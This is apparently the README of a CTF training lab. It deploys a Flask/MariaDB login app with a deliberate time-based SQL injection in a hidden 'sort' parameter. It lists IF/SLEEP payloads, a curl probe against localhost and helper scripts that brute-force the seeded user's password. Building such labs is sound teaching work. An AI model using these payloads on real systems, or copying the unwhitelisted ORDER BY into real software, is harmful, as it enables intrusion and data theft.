# Baim2 CTF - Part 1 (Time-based SQLi)

To complete the first stage of the CTF, deploy the web app directly on a Linux VM (no Docker). The app provides a polished UI, user signup/login, and a **natural** time-based SQL injection in the login audit ordering. Classic SQLi payloads on credentials are parameterized and should fail.

## Features

- Flask web app with simple login and signup.
- MariaDB backend with seeded user (`clinician` / `clinic2024`).
- Time-based SQL injection via the `sort` parameter in the login audit ordering.
- Classic SQLi on username/password is blocked via parameterized queries.

## Setup (VM)

```bash
./setup.sh
```

What it does:

1. Installs Python + MariaDB packages and `bc` (used by the test script).
2. Creates a virtualenv in `ctf_app/.venv` and installs Flask + PyMySQL.
3. Starts MariaDB and creates the `ctf_user` account.
4. Loads the schema and seed user into `ctf_db`.

If MariaDB is already running, the script is idempotent and will reuse it.

## Run

```bash
./run.sh
```

Open: `http://127.0.0.1:5000`

## Vulnerability (natural time-based SQLi)

The login page uses a query that orders the login audit table based on a `sort` parameter. Because the order clause is constructed without a whitelist, an attacker can inject expressions that are still valid SQL (e.g. `created_at, IF(1=1, SLEEP(3), 1)`), causing a measurable delay. No hardcoded sleep is used; the delay is a database-side function executed by the injected expression.

Classic SQLi on username/password uses parameterized queries, so inputs like `' OR 1=1 --` do not bypass authentication.

## How to solve (player-facing instructions)

1. Go to **Sign in** and inspect the POST parameters. There is a hidden field named `sort`.
2. Send a request with `sort=created_at, IF(1=1, SLEEP(3), 1)`.
3. Observe the response delay (~3 seconds) to confirm time-based SQLi.
4. Use boolean conditions with `IF` + `SLEEP` to infer data:
   - Database length: `sort=created_at, IF(LENGTH(DATABASE())=6, SLEEP(3), 1)`
   - First character: `sort=created_at, IF(SUBSTRING(DATABASE(),1,1)='c', SLEEP(3), 1)`
5. Iterate over positions and character sets to exfiltrate values.

Example with `curl`:

```bash
curl -s -o /dev/null -w "%{time_total}\n" \
  -X POST http://127.0.0.1:5000/login \
  -d "username=invalid" \
  -d "password=invalid" \
  --data-urlencode "sort=created_at, IF(1=1, SLEEP(3), 1)"
```

## Tests (verification)

Start the app first (`./run.sh`), then run:

```bash
./tests.sh
```

The tests check:

- Classic SQLi payload on username is rejected and returns quickly.
- Time-based SQLi payload on the `sort` parameter triggers a noticeable delay.
- Legitimate sorting values (created_at / username) still return quickly.
- An invalid `sort` value causes a 500 error (to show lack of whitelisting).
- Multiple classic SQLi payloads in **both** username and password are rejected.

Manual verification (optional):

1. Try login with username `clinician` and password `clinic2024` to confirm success.
2. Try classic SQLi in username: `' OR 1=1 --` and ensure it **fails**.
3. Try time-based payload in `sort` and ensure the response is delayed.

## Time-based SQLi helper scripts

### 1) Quick delay probe

```bash
./scripts/time_sqli_probe.sh
```

Environment options:

- `BASE_URL` (default `http://127.0.0.1:5000`)
- `DELAY` (default `3`)

### 2) Wordlist-based login discovery (time-based)

This script uses a time-based `IF(..., SLEEP, ...)` condition to check a wordlist against the stored hash for a user, and then attempts login when a delay is observed.

```bash
python3 scripts/time_sqli_wordlist.py --base-url http://127.0.0.1:5000 \
  --username clinician \
  --wordlist scripts/wordlist.txt \
  --delay 3 \
  --threshold 2.5 \
  --timeout 15
```

Notes:

- Adjust `--delay` and `--threshold` if your VM is slow.
- Increase `--timeout` if the server responds slowly or you see timeout errors.
- The provided `wordlist.txt` includes the seeded password (`clinic2024`) so the script demonstrates a full compromise flow.
- If you are copy-pasting from chat/markdown, ensure the command uses **real newlines** with trailing `\` (not literal `\\n`).

Single-line version (safe to paste):

```bash
python3 scripts/time_sqli_wordlist.py --base-url http://127.0.0.1:5000 --username clinician --wordlist scripts/wordlist.txt --delay 3 --threshold 2.5 --timeout 15 --preflight
```

If you keep seeing timeouts, confirm the app is running and reachable:

```bash
curl -I http://127.0.0.1:5000/login
```
